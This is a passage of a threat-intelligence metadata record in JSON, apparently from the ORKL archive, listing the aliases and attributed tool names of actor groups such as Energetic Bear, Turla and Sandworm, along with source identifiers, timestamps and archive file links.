            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1592988487,
    "ts_modification_date": 1592988487,
    "files": {
        "pdf": "https://archive.orkl.eu/a9c9b4910bd75eb90a8fa7110bceb70b65532110.pdf",
        "text": "https://archive.orkl.eu/a9c9b4910bd75eb90a8fa7110bceb70b65532110.txt",
        "img": "https://archive.orkl.eu/a9c9b4910bd75eb90a8fa7110bceb70b65532110.jpg"
    }
}